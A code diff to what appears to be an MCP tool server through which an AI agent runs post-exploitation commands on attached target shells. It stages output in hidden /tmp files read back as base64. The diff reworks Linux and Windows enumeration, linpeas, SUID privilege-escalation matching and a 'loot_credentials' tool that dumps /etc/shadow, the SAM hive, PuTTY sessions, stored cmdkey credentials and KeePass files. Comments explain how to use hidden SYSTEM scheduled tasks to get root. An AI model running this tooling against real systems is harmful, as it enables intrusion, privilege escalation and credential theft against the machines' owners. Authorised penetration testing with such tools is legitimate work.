@@ -164,9 +164,129 @@ async def _send_and_read(
         return {"ok": False, "error": f"shell MCP call failed: {exc}"}
 
 
+def _decode_file_sweep(
+    pane: str, begin: str, end: str, sec: str, cmds: list[str], *, cap: int = _ISOLATE_CAP
+) -> dict[str, Any]:
+    """Recover per-command outputs from a base64'd file read of a sweep.
+
+    `pane` is the capture of `base64 <file>` bracketed by `begin`/`end`. We pull
+    the slice between the markers, strip everything outside the base64 alphabet
+    (drops any interleaved pane noise + the newlines `base64` wraps at), decode,
+    then split the decoded text on the per-section marker `sec` to map each
+    command to its output. Returns `{results, polluted}`; `polluted=True` means
+    the markers/base64 didn't survive (genuinely flooded pane) so the caller can
+    warn and the agent can retry the read or fall back.
+    """
+    import base64 as _b64
+    import re as _re
+
+    bi = pane.rfind(begin)
+    if bi == -1:
+        return {"results": [{"cmd": c, "output": ""} for c in cmds], "polluted": True}
+    body = pane[bi + len(begin):]
+    ei = body.find(end)
+    if ei == -1:
+        return {"results": [{"cmd": c, "output": ""} for c in cmds], "polluted": True}
+    blob = _re.sub(r"[^A-Za-z0-9+/=]", "", body[:ei])
+    try:
+        text = _b64.b64decode(blob + "===").decode("utf-8", "replace")
+    except (ValueError, _b64.binascii.Error):
+        return {"results": [{"cmd": c, "output": ""} for c in cmds], "polluted": True}
+
+    sections = text.split(sec)[1:]  # drop the empty lead before the first marker
+    results = []
+    for i, cmd in enumerate(cmds):
+        out = sections[i].strip("\r\n") if i < len(sections) else ""
+        if len(out) > cap:
+            out = out[:cap] + f"\n...[+{len(out) - cap} chars truncated]"
+        results.append({"cmd": cmd, "output": out})
+    # Fewer sections than commands ⇒ the file write was cut short.
+    polluted = len(sections) < len(cmds)
+    return {"results": results, "polluted": polluted}
+
+
+async def _run_sweep_to_file(
+    session_name: str, cmds: list[str], *, run_timeout_s: float = 120.0, cap: int = _ISOLATE_CAP
+) -> dict[str, Any]:
+    """Run a POSIX enum sweep into a file on the target, then read the file back.
+
+    Replaces the per-command pane capture (which a flooding service corrupts and
+    a slow `find /` outruns — both surfacing as false `PANE_POLLUTED`). The sweep
+    is redirected to a file (`> FILE 2>&1`), so its output lands on disk
+    untouched by the tty; only a `DONE` sentinel hits the pane, which we poll for
+    instead of racing a fixed read timeout against the commands. We then read the
+    file back as one base64 blob (retryable — the file persists). Returns
+    `{ok, results, polluted}` or `{ok: False, error}`.
+    """
+    tok = secrets.token_hex(4)
+    f = f"/tmp/.vse_{tok}"
+    sec = f"@@VSEC_{tok}@@"
+    done = f"@@VSDONE_{tok}@@"
+    begin, end = f"__VSb_{tok}__", f"__VSe_{tok}__"
+
+    parts = [f": > {f}"]
+    for cmd in cmds:
+        parts.append(f"printf '%s\\n' {shlex.quote(sec)} >> {f}")
+        parts.append(f"{{ {cmd} ; }} >> {f} 2>&1")
+    parts.append(f"printf '%s\\n' {shlex.quote(done)}")
+    sweep = "; ".join(parts)
+    # `base64 -w0` (GNU) falls back to plain `base64` (busybox); newlines are
+    # stripped in _decode_file_sweep regardless.
+    read_back = (
+        f"printf '\\n{begin}\\n'; (base64 -w0 {f} 2>/dev/null || base64 {f} 2>/dev/null); "
+        f"printf '\\n{end}\\n'"
+    )
+
+    try:
+        async with streamablehttp_client(SHELL_MCP_URL) as (r, w, _):
+            async with ClientSession(r, w) as session:
+                await session.initialize()
+
+                async def _call(tool: str, args: dict[str, Any]) -> dict[str, Any]:
+                    raw = await session.call_tool(tool, {"session_name": session_name, **args})
+                    if getattr(raw, "isError", False):
+                        return {"ok": False, "error": f"{tool} failed: {_parse_tool_result(raw)}"}
+                    return _parse_tool_result(raw)
+
+                send = await _call("tmux_send", {"command": sweep})
+                if send.get("ok") is False:
+                    return {"ok": False, "error": f"tmux_send failed: {send.get('error', send)}"}
+
+                # Poll the pane for the DONE sentinel, decoupled from command
+                # duration. Each read waits for the prompt, so this is a few
+                # cheap iterations, not a busy-loop.
+                pane = ""
+                waited = 0.0
+                step = 15.0
+                while done not in pane and waited < run_timeout_s:
+                    read = await _call("tmux_read", {"timeout_s": step, "max_bytes": _ISOLATE_READ_BYTES})
+                    if read.get("ok") is False:
+                        return {"ok": False, "error": f"tmux_read failed: {read.get('error', read)}"}
+                    pane = read.get("output", "") or ""
+                    waited += step
+
+                rb_send = await _call("tmux_send", {"command": read_back})
+                if rb_send.get("ok") is False:
+                    return {"ok": False, "error": f"tmux_send failed: {rb_send.get('error', rb_send)}"}
+                rb = await _call("tmux_read", {"timeout_s": 20.0, "max_bytes": _ISOLATE_READ_BYTES})
+                if rb.get("ok") is False:
+                    return {"ok": False, "error": f"tmux_read failed: {rb.get('error', rb)}"}
+
+                decoded = _decode_file_sweep(rb.get("output", "") or "", begin, end, sec, cmds, cap=cap)
+                await _call("tmux_send", {"command": f"rm -f {f}"})  # best-effort cleanup
+                return {"ok": True, **decoded}
+    except Exception as exc:  # noqa: BLE001 — surface transport issues, don't crash the tool
+        return {"ok": False, "error": f"shell MCP call failed: {exc}"}
+
+
 @app.tool()
 async def linux_basic_enum(session_name: str) -> dict[str, Any]:
-    """Run a small, low-noise Linux enum sweep against an attached shell."""
+    """Run a small, low-noise Linux enum sweep against an attached shell.
+
+    Output is staged to a file on the target and read back (see
+    `_run_sweep_to_file`) so a flooding service or a slow `find` can't corrupt or
+    truncate the capture into a false pollution warning.
+    """
     cmds = [
         "id", "uname -a", "cat /etc/os-release",
         "ls -la /home", "sudo -n -l", "find / -perm -4000 -type f 2>/dev/null | head -50",
@@ -174,15 +294,11 @@ async def linux_basic_enum(session_name: str) -> dict[str, Any]:
         "cat /etc/passwd",
         "ls -la /etc/cron.d /etc/cron.* 2>/dev/null",
     ]
-    outputs = []
-    polluted = 0
-    for cmd in cmds:
-        result = await _send_and_read(session_name, cmd, isolate=True)
-        outputs.append({"cmd": cmd, "output": result.get("output", "")})
-        if result.get("polluted"):
-            polluted += 1
-    resp: dict[str, Any] = {"ok": True, "results": outputs}
-    if polluted >= max(2, len(cmds) // 2):
+    res = await _run_sweep_to_file(session_name, cmds)
+    if res.get("ok") is False:
+        return res
+    resp: dict[str, Any] = {"ok": True, "results": res["results"]}
+    if res.get("polluted"):
         resp["warning"] = _POLLUTED_SHELL_WARNING
     return resp
 
@@ -251,13 +367,25 @@ async def linpeas(session_name: str, mode: str = "fast", url: str | None = None)
     re-call with `url=`.
     """
     timeout = 400.0 if mode == "thorough" else 200.0
-    return await _send_and_read(session_name, _linpeas_command(mode, url), timeout_s=timeout)
+    # File-staged: linpeas runs for minutes and emits ~150 highlight lines — a
+    # pane read would time out (false pollution) or get truncated by background
+    # flood. The full report still lands in `_LINPEAS_OUT` to grep further.
+    res = await _run_sweep_to_file(
+        session_name, [_linpeas_command(mode, url)], run_timeout_s=timeout, cap=12000
+    )
+    if res.get("ok") is False:
+        return res
+    resp: dict[str, Any] = {"ok": True, "output": res["results"][0]["output"]}
+    if res.get("polluted"):
+        resp["warning"] = _POLLUTED_SHELL_WARNING
+    return resp
 
 
 @app.tool()
 async def windows_basic_enum(session_name: str) -> dict[str, Any]:
     """Windows enum sweep — identity, privs, OS/patch level, services,
-    installed software, scheduled tasks, stored creds, listening ports.
+    installed software, scheduled tasks (with their executable + run-as user,
+    including ones hidden from `schtasks /query`), stored creds, listening ports.
 
     The output of these checks is exactly what's needed to pin the right
     privesc binary variant (GodPotato `-NET2/-NET35/-NET4`, JuicyPotato vs
@@ -284,6 +412,21 @@ async def windows_basic_enum(session_name: str) -> dict[str, Any]:
         "tasklist /svc",
         # Scheduled tasks (often run as SYSTEM with weak paths).
         "schtasks /query /fo csv /v",
+        # Task -> executable -> run-as, structured, in ONE line. This is the
+        # signal that decides a scheduled-task privesc: a task whose RunAs is a
+        # higher-priv user (Administrator/SYSTEM) and whose Execute path you can
+        # write is a direct root. `schtasks /query` HIDES protected tasks; this
+        # PowerShell view surfaces them, and the on-disk dump below catches the
+        # rest. Read the Action/RunAs columns before trying to interact with any
+        # task — never race a task you haven't inspected.
+        ('powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object { '
+         "[PSCustomObject]@{ Task=$_.TaskPath+$_.TaskName; "
+         "RunAs=$_.Principal.UserId; "
+         "Action=($_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join '|' } } | "
+         'Where-Object { $_.RunAs -match \'SYSTEM|Administrator|^NT \' -or $_.Action } | '
+         'Format-Table -AutoSize | Out-String -Width 4096"'),
+        # On-disk task definitions (catches tasks hidden from `schtasks /query`).
+        'dir /a /b "C:\\Windows\\System32\\Tasks" 2>nul',
         # Stored credentials — cmdkey list + creds folder.
         "cmdkey /list",
         'dir /a "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials" 2>nul',
@@ -310,9 +453,13 @@ async def windows_basic_enum(session_name: str) -> dict[str, Any]:
 @app.tool()
 async def suid_enum(session_name: str) -> dict[str, Any]:
     """Parse SUID binary output and surface candidate privesc paths via GTFOBins."""
+    # File-staged: `find /` is slow enough to outrun a pane-read timeout (false
+    # pollution) and a noisy shell drops lines — both lose SUID paths.
     cmd = "find / -perm -4000 -type f 2>/dev/null"
-    result = await _send_and_read(session_name, cmd, timeout_s=60.0, isolate=True)
-    output = result.get("output", "")
+    res = await _run_sweep_to_file(session_name, [cmd])
+    if res.get("ok") is False:
+        return res
+    output = res["results"][0]["output"]
 
     suids = []
     for line in output.splitlines():
@@ -323,7 +470,7 @@ async def suid_enum(session_name: str) -> dict[str, Any]:
 
     candidates = _gtfobins_match(suids)
     resp: dict[str, Any] = {"ok": True, "suids_found": suids, "privesc_candidates": candidates}
-    if result.get("polluted"):
+    if res.get("polluted"):
         resp["warning"] = _POLLUTED_SHELL_WARNING
     return resp
 
@@ -435,25 +582,27 @@ async def loot_credentials(session_name: str, os_kind: str = "linux") -> dict[st
             "ls -la /root/.ssh /home/*/.ssh 2>/dev/null",
             "cat /etc/shadow 2>/dev/null | head",
         ]
-    else:
-        cmds = [
-            "reg query HKLM\\SAM",
-            "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions",
-            "cmdkey /list",
-            "dir /s /b C:\\Users\\*.kdbx C:\\Users\\*.txt 2>nul",
-        ]
-    isolate = os_kind == "linux"  # marker isolation is POSIX-shell only
+        # File-staged read — base64 round-trip is POSIX-shell only (see linux_basic_enum).
+        res = await _run_sweep_to_file(session_name, cmds)
+        if res.get("ok") is False:
+            return res
+        resp: dict[str, Any] = {"ok": True, "results": res["results"]}
+        if res.get("polluted"):
+            resp["warning"] = _POLLUTED_SHELL_WARNING
+        return resp
+
+    # Windows: no base64 file round-trip, capture each command from the pane.
+    cmds = [
+        "reg query HKLM\\SAM",
+        "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions",
+        "cmdkey /list",
+        "dir /s /b C:\\Users\\*.kdbx C:\\Users\\*.txt 2>nul",
+    ]
     outputs = []
-    polluted = 0
     for cmd in cmds:
-        result = await _send_and_read(session_name, cmd, isolate=isolate)
+        result = await _send_and_read(session_name, cmd, isolate=False)
         outputs.append({"cmd": cmd, "output": result.get("output", "")})
-        if result.get("polluted"):
-            polluted += 1
-    resp: dict[str, Any] = {"ok": True, "results": outputs}
-    if isolate and polluted >= max(2, len(cmds) // 2):
-        resp["warning"] = _POLLUTED_SHELL_WARNING
-    return resp
+    return {"ok": True, "results": outputs}
 
 
 def main() -> None:
